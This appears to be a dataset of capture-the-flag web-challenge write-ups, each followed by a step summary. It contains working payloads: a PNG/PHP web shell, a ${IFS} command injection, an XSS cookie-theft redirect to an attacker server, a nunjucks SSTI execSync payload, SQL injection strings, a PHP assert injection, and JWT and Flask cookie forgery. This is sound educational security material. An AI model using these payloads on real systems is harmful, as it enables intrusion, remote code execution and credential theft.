7. So, we have control over the file name, but the application checks for a valid PNG. Let's see how it's doing that file type check by uploading the same picture with the name `Red.png.php`. This is successful, but trying to upload a text file that has `.php` in the name fails.

8. We can go through the file upload methodology discussed on HackTricks (https://book.hacktricks.xyz/pentesting-web/file-upload). It turns out that the application is checking if the magic bytes of a PNG image are present. So, let's create a file with those bytes and a call to `phpInfo`. The magic bytes for a PNG are `\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[` and we can call `phpInfo` with `<?php phpInfo(); ?>`. So, we run `printf ""\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[<?php phpInfo(); ?>"" > exploit_test.png.php` to get our image/php file/exploit. Uploading this file and then right clicking on our profile file and selecting ""Open Image in New Tab"" displays the PHP info page. We have achieved remote code execution.

9. So, lets pop a shell instead of showing the info page by running `<?php echo system($_GET['cmd']); ?>` instead of `<?php phpInfo(); ?>`. Create the exploit file with `<?php phpInfo(); ?>`. So, we run `printf ""\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[<?php echo system(\$_GET['cmd']); ?>"" > exploit.png.php`

10. Uploading and navigating to this image appears to work. Now we can run commands by setting the `cmd` parameter to the command we want to run. So, let's try to find the flag with `http://IP:PORT/uploads/195c2_exploit.png.php?cmd=ls%20-la%20/`. This reveals a file called `flag_65890d927c37c33.txt`. Let's open that file with `http://IP:PORT/uploads/195c2_exploit.png.php?cmd=cat%20/flag_65890d927c37c33.txt`. Running this prints the flag.
","Visit the website, create an account, and sign in.
Observe a message about needing admin approval to edit the profile.
Inspect the HTML and notice a hidden JS code snippet.
Decode the ""PHPSESSID"" cookie and find an ""approved"" field.
Change the ""approved"" value to true, re-encode, and replace the cookie.
Upload a PNG profile picture, noticing the filename control and validation.
Test various file uploads to determine the file type check method.
Create a file with PNG magic bytes and a call to `phpInfo` for a combined image/PHP exploit.
Replace the `phpInfo` call with a shell command execution in the exploit.
Run commands using the ""cmd"" parameter and locate the flag file, then print the flag.
"
"1. The website allows us to view some properties about a linux system. The output looks just like standard linux commands. The output of the ""List Storage"" command seems to be executing `df -h`.

2. At this point, I guessed that this was a command injection challenge and I tried accessing `http://IP:PORT/?command=ls""` to see if I could list the contents of the current directory. Sure enough, this worked, confirming my suspicions. This is in fact a command injection challenge.

3. Looking at the source code, we see in `challenge/models/MonitorModel.php` that `shell_exec` is used to run the `santa_mon.sh` script. Our input in the `command` URL parameter is then appended to `/santa_mon.sh ` so that the final command looks like this: `/santa_mon.sh [COMMAND PARAMETER INPUT]`. In other words, we control the first argument passed to the `santa_mon.sh` program. Importantly, The `sanitize` function is called on our input, which removes spaces using the `s+` regular expression.

4. We can see the source code of the `santa_mon.sh` program in `config/santa_mon.sh` in our downloaded ZIP. We see that the buttons in the web interface do indeed run standard linux commands. At the bottom we see that if there is an argument to the program, it is executed as a command.

5. `config/santa_mon.sh` shows that the `ups_status` and `restart_ups` commands return the output from a local web server using curl. If you check the output of the ""List Processes"" command you will see `python3 /root/ups_manager.py`. Let's check out the source code for `config/ups_manager.py`. This file runs an HTTP server with the two endpoints accessed by the `ups_status` and `restart_ups` commands, but it also has a `/get_flag` endpoint that prints the flag!

6. So, our approach to get the flag is to craft a command injection payload without using spaces that will run `curl http://localhost:3000/get_flag` and return the output to us through the webpage. Using a standard approach to remove spaces (such as those from the excellent guide at [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)) will not work here because our input is stripped of whitespace and then passed as an argument to another program. Thus, use can use something like the `IFS` variable, since hte PHP code will not strip that out, but when it is parsed by bash it will be interpreted as a second argument to the `santa_mon.sh` script. For instance, if our command injection is `curl${IFS}http://localhost:3000/get_flag` then PHP will execute, `/santa_mon.sh curl${IFS}http://localhost:3000/get_flag`, bash will interpret this as `/santa_mon.sh curl http://localhost:3000/get_flag`, and then the `santa_mon.sh` script will see `curl` as the first argument and will run `curl` without any arguments.

7. To solve this, we simply wrap our payload in double quotes like so: `""curl${IFS}http://localhost:3000/get_flag""` (URL encoded: `%22curl${IFS}http://localhost:3000/get_flag%22`). This way, PHP will execute `/santa_mon.sh ""curl${IFS}http://localhost:3000/get_flag""`, bash will interpret this as `/santa_mon.sh ""curl http://localhost:3000/get_flag""`, then the `santa_mon.sh` script will see the string `""curl http://localhost:3000/get_flag""` as the first parameter, it will run our payload, and the PHP server will return the output containing the flag.

8. So, the final payload is `http://IP:PORT/?command=%22curl${IFS}http://localhost:3000/get_flag%22`.
","Observe the website output, which appears like standard Linux commands.
Test for command injection by appending `ls` to the URL, confirming the vulnerability.
Examine the source code, finding that the input is sanitized and passed as an argument to `santa_mon.sh`.
Investigate the `santa_mon.sh` program, discovering that it executes commands based on input.
Analyze the `config/ups_manager.py` file, finding a `/get_flag` endpoint.
Craft a command injection payload without spaces, using the `IFS` variable.
Wrap the payload in double quotes to ensure it is interpreted correctly.
Execute the final payload using the URL, retrieving the flag.
"
"1. Looking at the source code we see that in the `challenge/helpers/JWTHelper.js` file, both the ""RS256"" and ""HS256"" algorithms are allowed for decryption. This is CVE-2016-5431/CVE-2016-10555.

2. The HS256 algorithm is symmetric, which means it uses the sane secret key to sign and verify each message. The RS256 algorithm is asymmetric, which means it uses a private key to sign the message and a public key for verification. However, if we change the algorithm from RS256 to HS256, the backend code will use the public key as the symmetric secret key. In other words, the HS256 algorithm will be used to verify the signature with the public key as the HS256 secret key. We know the public key so we can, in theory, easily modify the JWT and sign it.

3. However, before we can do this we need to get the JWT token and get the public key. So, make an account on the website, open up your browser's cookie page in the developer tools, and copy the `session` cookie. We can use [JWT.io](https://jwt.io/) or [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool) to decode the cookie.
[Python command: Use jwt_tool.py to decode the JWT token]

4. Fortunately for us, the public key is encoded in the JWT. So, to get access to the `/api/elf/edit` and `/api/elf/list` endpoints, we need to tamper with this token to change the `username` to ""admin"" using the RS256-to-HS256 exploit.

5. There are an abundance of ways that you can perform the RS256-to-HS256 exploit: [3v4Si0N/RS256-2-HS256](https://github.com/3v4Si0N/RS256-2-HS256), [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool), manually via [JWT.io](https://jwt.io/), by running the commands in [this excellent guide](https://habr.com/en/post/450054/). However, you have to be very careful about newlines in the public key. I tried all of these methods with about every option possible. One way that worked is by running a command using `jwt_tool.py`, providing the JWT and public key as input, applying the key confusion exploit and specifying the username to be changed to ""admin"".
Alternatively, see [Alternative JWT Decoding Steps](#alternative-jwt-decoding-steps) for an approach using [JWT.io](https://jwt.io/).

The output of this command has the tampered token.

6. Anyway, once you have the tampered token, swap it out with the non-admin token in your browser's developer tools. Now, we can access the admin dashboard and the `/api/elf/edit` and `/api/elf/list` endpoints.

7. Back in the source code, if we look at the `challenge/routes/index.js` file we see that the `/` endpoint uses the `CardHelper` class to generate the card with a list of the elf's names. Since we are now an admin, we can edit the names of these elfs, and thus we control this value. Looking at `challenge/helpers/CardHelper.js`, we notice that the `nunjucks` templating engine is used and that we can contol what is passed to a `nunjucks` template. Thus, this is a `nunjucks` SSTI (Server-Side Template Injection).

8. Searching for ""nunjucks ssti"" reveals [this great guide](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine) about breaking out of the `nunjucks` templating engine. We can run `{{range.constructor(""return global.process.mainModule.require('child_process').execSync('cat /flag*')"")()}}` to print the contents of the `/flag` file. We determined that this is where the flag is by looking at the `Dockerfile` in the challenge ZIP. The `flag` file is copied to `/flag` within the container.

9. So, in the admin dashboard, we copy and paste out payload `{{range.constructor(""return global.process.mainModule.require('child_process').execSync('cat /flag*')"")()}}` into one off the elf's name field, submit the changes, and then we navigate back to the home page, `/`, and there's the flag. You can view the source of this page to make copy and pasting the flag easier.

### Alternative JWT Decoding Steps

1. Get a JWT token from the application by signing into any account and paste it into [JWT.io](https://jwt.io/).

2. Copy the public key and make sure that there is no new line at the end. I got this public key from [JWT.io](https://jwt.io/):
[Public key obtained from JWT.io]

3. Base64 encode the public key with `echo -en ""public key"" | base64`. We use the `-e` and `-n` flags with `echo` to tell it to intepret escape sequences and to not output a newline at the end.
[Bash command: Base64 encode the public key]

4. Paste the JWT into [JWT.io](https://jwt.io/) again. Then, change change the algorithm to ""HS256"" and change the `username` field to ""admin"". Next, paste the base64 encoded key into the ""your-256-bit-secret"" field. Check the ""secret base64 encoded"" box, and now you should have your tampered JWT.
","Examine the source code, finding that both ""RS256"" and ""HS256"" algorithms are allowed for decryption.
Understand the differences between the HS256 and RS256 algorithms.
Create an account on the website, and obtain the JWT token and public key.
Tamper with the token to change the `username` to ""admin"" using the RS256-to-HS256 exploit.
Swap the tampered token with the non-admin token in your browser's developer tools to access the admin dashboard.
Examine the source code again to identify a potential `nunjucks` SSTI vulnerability.
Utilize a payload that breaks out of the `nunjucks` templating engine to read the flag file.
Insert the payload into one of the elf's name fields in the admin dashboard, and navigate to the homepage to reveal the flag.
"
"1. The website is a simple login page.

2. After looking at the source code for a while, I noticed that the `database.sql` file contains the password hashes for a manager and admin user. [CrackStation](https://crackstation.net/) is a great way to see if these are known hashes, so I pasted them both in and got the credentials `manager:bigsanta!` and `admin:tryharder`.

3. `manager:bigsanta!` is a valid login by `admin:tryharder` is not. After signing in we can see a list of toys and some other properties.

4. Looking back at the source code in the `database.sql` file we see that the flag is contained in the database with the rest of the toys, but it has the approved value set to 0 instead of 1.

5. In `challenge/routes/index.js` we see that the `/api/toylist` endpoint will set `approved` to 1 unless the currently signed in user has the username `admin`. So, we have to sign in as admin.

6. My first thought was that this was a JWT challenge since JWTs are used and we are given a user with valid credentials. However, after poking around, the `database.js` source code shows that users are authenticated like so: `let stmt = ""SELECT username FROM users WHERE username = '${user}' and password = '${pass}'\"";`. This looks like it could be vulnerable to a SQL injection.

7. On the main login page, I tried some common SQL injection payloads from [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass). The one that ended up working was username `admin' -- ` and the password can be anything. This will show us the final ""unapproved toy"" which is the flag.
","Examine the website and find the `database.sql` file containing password hashes.
Use CrackStation to crack the hashes, obtaining credentials for the manager and admin users.
Log in with the manager credentials, viewing a list of toys and properties.
Identify the flag in the database with an ""approved"" value set to 0.
Find the `/api/toylist` endpoint in the `challenge/routes/index.js` file, and note that the ""approved"" value must be 1 for the admin user.
Notice the potential SQL injection vulnerability in the `database.js` file.
Attempt various SQL injection payloads on the main login page, ultimately using the payload `admin' --` to bypass authentication and reveal the flag.
"
"1. Let's start by looking at the `challenge/index.js` file in the source code zip. The application connects to a sqlite database (`const db = new Database('toy_workshop.db');`), so lets look at `database.js`.

2. `database.js` allows for adding and reading items from the database. While we do control the `query` variable via the website, it does not look like we would be able to accomplish anything using an SQL injection.

3. Let's look at the `challenge/routes/index.js` file. There is an `/api/submit` endpoint which the frontend posts user data to. This function adds our user input, called a query, to the database and then calls `bot.readQueries(db)`. The `/queries` endpoint simply returns all the queries contained in the database. We cannot access the `/queries` endpoint because the IP address must be `127.0.0.1`, which is the localhost loopback address, otherwise the page redirects to `/`.

4. Next, let's check out `challenge/bot.js` so we can figure out what `bot.readQueries(db)` does. `bot.js` imports puppeteer, a headless Chromium browser controlled via JavaScript, defines a `flag` variable that holds the flag, loads the index page of the application, sets the `flag` cookie in the browser, visits the `/queries` endpoint, and then exits.

5. This is a stored cross-site scripting vulnerability (Stored XSS). We can send a malicious script through the frontend to the database. When a user visits the `/queries` page, the server will serve the malicious code to the user. We can craft our malicious code to grab the current cookies and then redirect to a webpage we control with those cookies as parameters in the request.

6. The malicious code is standard XSS code: `<script>document.location='http://<ATTACKER_SERVER>?c='+document.cookie;</script>`. We redirect to our webpage by changing the `document.location` and we set the `c` argument to `document.cookie`, which contains the current page's cookies.

7. However, we need to actually run a server to receive this request and log the cookie. There is a basic [Flask](https://flask.palletsprojects.com), a micro web framework written in Python, application that does exactly this in [xss-cookie-stealer.py](xss-cookie-stealer.py). The script defines one route, `/`, that will read the `c` parameter in the request URL, open a file called `cookies.txt`, write the contents of the `c` parameter to that file, and then redirect to `https://google.com`. We run this server on all interfaces (`0.0.0.0`) on port `16361`.

8. You can run this script anywhere that is internet accessible. For instance you can port forward port `16361` through your router or you could deploy a machine on Google Cloud. But, the easiest method is to use [ngrok](https://ngrok.com/).

9. Create an account at <https://ngrok.com/>, download the application, and get logged in. Now, start the Flask python server with `python xss-cookie-stealer.py` and then run `/ngrok http 16361`. Ngrok will display a URL in the form `http://<subdomain>.ngrok.io`.

10. Paste your ngrok URL into the malicious payload. If ngrok said my URL was `http://92832de0.ngrok.io`, then the payload should be `<script>document.location='http://92832de0.ngrok.io?c='+document.cookie;</script>`

11. Finally, paste the payload into the frontend for the application, wait a few second for the puppeteer instance to start and load the page, and then you should see the flag in your terminal running Flask and in the `cookies.txt` file.
","Examine the `challenge/index.js` and `database.js` files to understand how the application connects to the SQLite database.
Analyze the `challenge/routes/index.js` file, focusing on the `/api/submit` and `/queries` endpoints.
Investigate the `challenge/bot.js` file to understand the use of Puppeteer and the `flag` variable.
Identify a stored cross-site scripting vulnerability (Stored XSS) and plan to exploit it by sending a malicious script.
Create the malicious XSS payload to redirect the target to an attacker-controlled server with the current cookies as URL parameters.
Set up a Flask server with the script `xss-cookie-stealer.py` to receive the request and log the stolen cookie.
Use a service like ngrok to create an internet-accessible server.
Insert the ngrok URL into the malicious payload.
Paste the payload into the frontend of the application, wait for the Puppeteer instance to load the page, and obtain the flag from the Flask server terminal or the `cookies.txt` file.
"
"Hint: ""80s action movies really inject you full of adrenaline!""

This challenge gives provides you a website with the ability to upload a barcode. The website will ""scan"" this barcode and will return information about the movie title that was encoded.

1. To solve this challenge, generate a barcode with a SQL injection that returns all rows using an online barcode generator.
    * For example, `' OR 1=1;  --  `
2. Upload the barcode to the website.
3. The flag can be found at the bottom of the returned results.
","Generate a barcode with a SQL injection that returns all rows using an online barcode generator, such as `' OR 1=1; --`.
Upload the barcode to the website.
Find the flag at the bottom of the returned results.
"
"Hint: ""There is a vulnerability in the way that the server takes user input and processes it.""

We see that this website is running on Flask, and that the logic for dealing with the input form is as follows: 
[Flask code: Process input using the eval() function and calculate jacket size]

This exploit relies on the dangerous use of Python's `eval()` function. When passed a string, `eval` will attempt to evaluate the string as a Python expression. Though the intended use-case here is to do basic math with strings (e.g., sending ""1+1"" will return `2`), we can also use it to send lines of code that we want Python to run. By using the `subprocess` library, we can execute shell commands from within Python. Especially useful is the `getoutput()` function, which will return the output of the command as a string. With this knowledge, and knowing that the flag is at `/flag/flag.txt`, we can craft the following payload:
[Payload: Use Python subprocess library to execute a shell command and read the flag from /flag/flag.txt]
","Analyze the Flask code and notice the dangerous use of Python's eval() function.
Understand that the `eval()` function can be exploited to execute shell commands using the `subprocess` library.
Craft a payload using the `subprocess` library to execute a shell command and read the flag from `/flag/flag.txt`.
"
"Hint: ""Github can be used for more than just storing code. The 'Actions' tab at the top of the repo might provide some insight.""

This challenge's exploit takes advantage of a misconfigured GitHub Actions build script.

1. The description mentions that this is a 'fully-automated release.' Instead of a link to a C binary, the challenge links us to a GitHub repo from a user named [Magpie Inc](https://github.com/magpie-inc/flag-checker)

2. The `magpie-inc` user seems to have a single public repo. The source code for the binary, `flagchecker.c`, is out here in the open. Looking closer at the source code, it appears that our Flag-Checker 9000 takes user input, hashes the input using MD5, and compares the result to a macro called `FLAG_HASH`.

3. As the hint mentions, there seems to be a lot of code here that isn't related to `flagchecker.c`. Perhaps the exploit isn't in the source code of Flag-Checker 9000 itself?

4. In the folder `.github/workflows`, we find a file called `build_flag_checker.yml`. It appears that this GitHub Action is the automated script responsible for packaging Flag-Checker 9000.

5. Reading the script `./build.sh` referenced in step 'Build Flag Checker Program' we can see that it uses the 1st command-line argument as the value assigned to the macro. `build_flag_checker.yml` is using the output of a previous step as the arg to the 'Build Flag Checker Program' step: ""${{ steps.get_hash.outputs.HASH_VALUE }}""

6. The output of the 'Get hash' step is the result of a second bash script, `flaghash.sh`. This one appears to cURL an IP address, and then hashes the results using MD5. We know that `flagchecker.c` is converting the user's guess to an MD5 hash and tells us that our flag is right if our hash matches the value of `FLAG_HASH`. However, the value of the cookie 'auth' in the curl request is set to `${ secrets.FLAG_AUTH }` which doesn't seem to be accessible in any of the files. In the workflow runs (accessible under the 'actions' tab on the repo), the value of FLAG_AUTH is starred out.

7. The last thing to investigate is the commit history. We can see that there is a commit with the message 'Fix auth!!!' 

8. If we look at the changes made for the commit, we see that an earlier version was set up slightly differently, with the 'auth' cookie set in the code of `gethash.sh` itself.

9. Run a cURL command with the discovered auth cookie to access the IP address, and the result is the flag!
","The challenge involves a misconfigured GitHub Actions build script in the 'magpie-inc/flag-checker' repo.
Examine 'flagchecker.c' source code, where `Flag-Checker 9000` takes user input, hashes it using MD5, and compares it to a macro called 'FLAG_HASH'.
Investigate the '.github/workflows/build_flag_checker.yml' file, which is responsible for packaging `Flag-Checker 9000`.
Analyze the 'build.sh' and 'flaghash.sh' scripts, revealing that 'FLAG_AUTH' is used as a cookie for a cURL request but isn't accessible in any file.
Check the commit history, finding a commit titled 'Fix auth!!!'.
Review the changes in the commit, discovering that the 'auth' cookie was previously set in 'gethash.sh'.
Run a cURL command with the discovered auth cookie to access the IP address and obtain the flag.
"
"The website appears to be a renderer for LaTeX code. Writing LaTex and clicking ""Generate PDF"" gives a link to a rendered PDf. The output LOG of the LaTeX renderer will also be displayed. 

1. Looking at the source HTML indicates that we need to read the flag from a file found in `/sweatin/to/the/oldies/flag.txt`.

2. LaTeX is turing-complete and has the ability to read files, however, certain strings have been blacklisted. Most notably, `/` has been blacklisted making it challenging to create the path to read the file.

3. The `/` character however can be isolated from `index.html` using the `\StrMid` function from the `xstring` package. By getting the `/` character from `index.html`, we can use it to build our path and bypass the blacklisted characters filter.

4. Using this we can write the following LaTeX code that will build the path and read the flag:
[LaTeX code: Uses xstring package to bypass blacklisted characters, build the path to the flag, and read it]

The flag can be found in the returned LOG data.

*Inspired and derived from [the web90 challenge in Internetwache CTF 2016](https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code)*
","Analyze the website, which is a LaTeX renderer that outputs a PDF and log data.
Examine the source HTML to find the path to the flag: `/sweatin/to/the/oldies/flag.txt`.
Bypass the blacklisted characters filter by using the `\StrMid` function from the `xstring` package to isolate the `/` character from `index.html`.
Write LaTeX code that uses the `xstring` package to bypass blacklisted characters, build the path to the flag, and read it.
Obtain the flag from the returned log data.
"
"This challenge gives you a file named `cipher` and the source code used to return the flag. Your goal is to reverse engineer the source code to create, and upload, the key that will allow the flag to be returned. This challenge requires you to exploit PHP loose comparison. In PHP versions less than 8 using `==` will loosly compare variables of different types, allowing expressions to implicitly evaluate to true. Any string (i.e. `password.txt`) compared with the integer `0` will evaluate to `true`. By making `to_check` equal to `0` we can echo the flag.

A table showing all of the PHP loose comparison values can be found [here](https://www.php.net/manual/en/types.comparisons.php).

1. In order to get the flag we need to ensure that `$to_check` is `0` to exploit PHP using loose comparison.

2. Create a 8 byte file that is equivalent to the the data in `cipher + 0xd34db33f` and upload it.
Your key will be XORed with `cipher + 0xd34db33f`. If they are equivalent then the XOR result will be zero.

3. The if statement will be `0 == ""whatever the password is""` which evaluates to true, and the flag will be echoed back.
","Understand that the challenge requires exploiting PHP loose comparison, specifically using `==` to compare variables of different types.
Ensure `$to_check` is `0` to exploit PHP loose comparison.
Create an 8-byte file equivalent to the data in `cipher + 0xd34db33f` and upload it.
The key will be XORed with `cipher + 0xd34db33f`, and if they are equivalent, the XOR result will be zero.
The if statement `0 == ""whatever the password is""` will evaluate to true, and the flag will be echoed back.
"
"Hint: ""Luckily, the intern was vaccinated. He got his INJECTION recently.""

1. Download app.py and examine the render function

2. Determine that template injection is possible when passing things in the textbox

3. Input `{{ state.flag }}` (you could also do `{{ state }}` and get the flag)
","Download and examine 'app.py', specifically the render function.
Identify that template injection is possible when passing values in the textbox.
Input `{{ state.flag }}` or `{{ state }}` in the textbox to retrieve the flag.
"
"Description: ""We received a message from the founder of Flag West. They said that there was one flag that they were able to hide before Mom & Pops got them all. The message said that it is hidden somewhere in the website, and that you just need to inspect it a little. Flag West was one of the first aquisitions that Mom & Pops made, so it is surprising to hear that there still might be a flag left. Get in there and find that flag, make Flag West's last act of defiance worth something.""

Hint: ""Use Dirb""

1. The flag is broken up into three parts that can be found by inspecting the code.

2. The first part is found as a comment within the HTML.

3. The second part of the flag is found as a comment in the style.css file

4. By using Dirb the thrird part of the flag can be found in the path academic/developers/secrets/final.txt

5. Combine all of the parts for the full flag submission
","Understand that the flag is divided into three parts, which can be found by inspecting the website code.
Locate the first part as a comment within the HTML.
Find the second part as a comment in the 'style.css' file.
Use Dirb to discover the third part in the path 'academic/developers/secrets/final.txt'.
Combine all parts to obtain the full flag for submission.
"
"Description: ""Your team has uncovered an old admin login page that Mom & Pops Flag Shop used to run back in the day. They overhauled their website after buying up all those other shops, but rumour has it that an old family flag was left behind. Forge a path, find the flag, and enjoy your baked goods.""

Hint: ""Ever had to forge a signature? Flask gives you good practice.""

1. When you first enter the site, you'll be met with a login page. Try and login using username: admin and password: admin. (Could change these for anything, doesn't really matter).

2. You'll then see a page saying that the login was incorrect, and to visit one of Mom & Pops' recently acquired companies. In here are a few random names, but one points to 'Robots.txt'.

3. Go to the robots.txt page for the site and you'll find that it tells you that your browser is unsupported and point you towards Internet Explorer 6.01.
The User-Agent for IE 6.01 is ""Mozilla/4.0 (compatible; MSIE 6.01; Windows NT 6.0)"" (from http://www.useragentstring.com/index.php?id=7730)

4. Next you can change your browser's user-agent by (in chromium):
- Go to 'Inspect'
- Click on the 3 dots in the right-hand corner
- 'More Tools'
- 'Network Conditions'
- Uncheck 'Use browser default'
- Enter the User-Agent for IE 6.01

5. Now, reload the page with the new user-agent and you'll find:
[Message from robots.txt with secret key: flour_sugar_chocolate_and_lotsalove]

6. There are some interesting words in here that might catch your eye and that relate to websites: cookies, flasks, and secret keys. If you're familiar with flask and how its session cookies work, you'll know that it signs them rather than encrypting, and to do this a ""secret key"" is used. If not, googling the key terms should get you a page like this one: https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce

7. Now you have a the secret key by which the cookies of this site are made: flour_sugar_chocolate_and_lotsalove. To obtain your current cookie, you could use 'Inspect' -> Storage -> Cookies and get the value. This is a Base64 encoding of the session data, a time stamp, and a cryptographic hash.

8. You can decode the cookie to obtain the session data with a tool like cyberchef: https://gchq.github.io/CyberChef/.
[Decoded example: {""admin"":false,""username"":""admin""}]

9. Since this is the admin account you're trying to access, you probably want to set the 'admin' field to 'true'. Unfortunately, you can't just change it to 'true' and send it off in a POST request because Flask still has the SHA1 hash which is based on the session data, the timestamp, and the secret key. Fortunately, Mom's leaked email gave you the secret key!

10. To craft the session cookie, that previous site (https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce) gives a good script, into which you just need to add the secret key and some session data for setting admin to true.
[Python script: Craft the session cookie with secret key and session data]

11. Running this script will give the new session cookie, which you can send to the site by intercepting an HTTP request/using a cookie editor tool.

12. Press 'login' on the login page once that new cookie's been put in and VOILA! The Flag!
","Attempt to log in with any username and password on the site's login page.
Visit the 'Robots.txt' page mentioned after the incorrect login attempt.
Change your browser's user-agent to Internet Explorer 6.01's user-agent.
Reload the page with the new user-agent and find the secret key.
Understand that Flask signs session cookies using a secret key.
Decode the current session cookie to obtain the session data.
Set the 'admin' field to 'true' in the decoded session data.
Craft a new session cookie using the secret key and modified session data.
Replace the existing session cookie with the newly crafted cookie.
Press 'login' on the login page with the new cookie, and obtain the flag.
"
"Description: ""Hello W-Team, Recon has found an old website from OmniFlags. We think there may be an insecure admin portal somewhere. See if there is anything you can find! They never did hire the best developers.""

Hints:
1. ""Beep Boop, now where did we put that page again?""
2. ""Cookies are stored locally, like in a cookie jar or something...""

1. The admin.html page needs to be found. There is an invisible link in the nav-bar. Robots.txt mentions `/admin.html`, or it can be seen when inspecting the code.

2. Once the admin login page is found, then you need to attempt to login. At this point a cookie is generated.

3. By checking the cookie, we can see that we have an admin cookie set to false. If the value is changed to 'true' the page will redirect to the flag.
","Locate the 'admin.html' page through an invisible link in the nav-bar, the 'Robots.txt' file, or by inspecting the code.
Attempt to log in on the admin page, which generates a cookie.
Check the cookie and find that the admin value is set to 'false'; change the value to 'true' to get redirected to the flag.
"
"Description: ""**URGENT**  W-Team, An OmniFlags educational website has been hacked by one of the captives in the space prison, who we believe has left a message for us. Can you find it?""

Hint: ""Someone had to add code to cause the flash on the screen. I wish we could stop this code from executing.""

When the website is first loaded, it can be seen that there is a flag that quickly changes to the omni flags logo after less than a second. Reloading this page will show the flash of the flag again but it is not fully readable. In order to keep the flag on the screen to make it readable, you need to:

1. Inspect the page

2. Navigate to the sources tab and open the javascript file

3. Create a breakpoint in this javascript file

4. Reload the page and the flag will stay on the screen.
","Inspect the page.
Navigate to the sources tab and open the JavaScript file.
Create a breakpoint in the JavaScript file.
Reload the page, and the flag will stay on the screen.
"
"So the challenge was an easy one. `Cheap` can be bought by entering a valid credit card but purchase failed for `flag`. After looking at the challenge for a very long time, `data` parameter in the URL looked suspicious.
[`data` during buying of `flag`]
[`data` contents during buying of `cheap`]
[`data` contents after failed purchase]
[`data` contents after successful purchase]

So, three successful purhases of `cheap` gave same prefix and prefix changed in unsuccessful purchase.
Also suffix of `c1` and `cp1` are same, so most probably they contain information about `product name` and suffix contain `purchase status` 

Initially I tried to decode the data contents but got no luck.
So I just tried to brute-force the prefix using the script.
[Python script: Brute-force the prefix by trying various combinations of the data from failed and successful purchases]

And obtained the flag URL.
","Observe that the `data` parameter in the URL looks suspicious during the purchase process.
Analyze the `data` contents during successful purchases of `cheap` and failed purchases of `flag`.
Notice that the successful purchases share the same prefix and the suffixes of `c1` and `cp1` are the same, likely containing product name and purchase status information.
Attempt to decode the `data` contents without success.
Create a Python script to brute-force the prefix by trying various combinations of the data from failed and successful purchases.
Obtain the flag URL using the brute-forced prefix.
"
"A quick look at the website's `.git` folder shows that we can access files such as `.git/HEAD` etc, but the directory wasn't directly browsable or clonable, so by using [dumper from GitTools](https://github.com/internetwache/GitTools). Looking through the repo and the files, the `flag.php` file doesn't have the flag, and no history information that has the file. Hence, I thought I should look at the source, and figure out a flaw that can be used on the server.

I was kinda stuck for a while, until @captn3m0 (Nemo) told me that the asserts (in [index.php](git-folder/index.php)) were in strings. Obviously, there was some sort of eval being done on the string.

So, using the page string as `' and die(show_source('templates/flag.php')) or '`, the assert would cause the source of the `flag.php` file to be revealed, which it did :)

BTW, the URL to run that page was `http://web.chal.csaw.io:8000/?page=%27%20and%20die(show_source(%27templates/flag.php%27))%20or%20%27`

Fun challenge overall :) Goes on to show that one should NEVER let user input be `eval`d in any way. [This stackoverflow answer](https://stackoverflow.com/questions/3115559/exploitable-php-functions) has a nice list of all the executable pathways in PHP.
","Discover that the website's `.git` folder is accessible, but not directly browsable or clonable.
Use the dumper from GitTools to access the repository and examine files such as `flag.php`.
Realize that the asserts in `index.php` are in strings, indicating the potential for an eval vulnerability.
Craft a page string `' and die(show_source('templates/flag.php')) or '` to exploit the vulnerability and reveal the source of `flag.php`.
Visit the URL `http://web.chal.csaw.io:8000/?page=%27%20and%20die(show_source(%27templates/flag.php%27))%20or%20%27` to run the crafted page string and obtain the flag.
Learn the lesson of never allowing user input to be `eval`d and refer to a list of exploitable PHP functions for future reference.
"
"One of the different admin pages (namely, `report`), was vulnerable to an SQL injection from the `id` parameter. This allowed us to leak one value of one column of information directly to the output.

Additionally, it was easy to notice that it was using MySQL. Hence, we could use the different ""special tables"" in MySQL with a `UNION SELECT` based query and obtain information.

The most irritating part of this process was finding the number of columns in the union select attack, since (for some reason), my extensions on Firefox were messing up, and I was constantly forced to manually keep running URLencode and URLdecode :(

Nevertheless, using `group_concat()`, it is possible to obtain all entries in a column, as a single row, and we used that to obtain information in a very fast way.

Without further ado, here are the different queries that were run (URLdecoded versions, for easier reading):
[A query to determine the number of columns in the UNION SELECT attack]
[A query to obtain table names from the information_schema.tables]
[A query to obtain column names from the information_schema.columns]
[A query to retrieve the flag from the flag column in the flag table]

The `flag` column in the `flag` table had the flag.
","Identify the `report` admin page as vulnerable to SQL injection from the id parameter, allowing leakage of one column of information directly to the output.
Recognize that the system is using MySQL and consider using ""special tables"" in MySQL with a `UNION SELECT` based query to obtain information.
Overcome the challenge of finding the number of columns in the UNION SELECT attack due to browser extension issues.
Utilize `group_concat()` to obtain all entries in a column as a single row, allowing for efficient information retrieval.
Execute the following queries (URLdecoded versions for easier reading):
determine the number of columns in the UNION SELECT attack;
obtain table names from the information_schema.tables;
obtain column names from the information_schema.columns;
retrieve the flag from the flag column in the flag table.
Find the flag in the `flag` column of the `flag` table.
"
"`/login.php` is vulnearable to sql injection.
However, filters were applied on the double quotes. By using a specific username and password combination, they were able to bypass the filter and log in as admin.

After logging in, the teammate pointed out that the site was also vulnerable to Local File Inclusion (LFI). They used an LFI technique to access a PHP script:
[PHP script: the site is under maintenance and all destructive actions are disabled]

Next, they used another LFI technique to access a PHP script containing the flag, but the password was missing. The PHP script had a username, a salt value, and an empty password field.
[PHP script: Generate the flag using the username, password, and salt]

Now using a Python script, we were able to brute-force the password.
[Python script: Brute-force the password]

So, this was the challenge which had all fruits in the basket, we had sqli, LFI, path transversal, blind sqli.
","Identify /login.php as vulnerable to SQL injection with filters applied on double quotes. Bypass the filter and log in as admin using a specific username and password combination.
Discover Local File Inclusion (LFI) vulnerability on the site after logging in.
Use an LFI technique to access a PHP script, revealing that the site is under maintenance and all destructive actions are disabled.
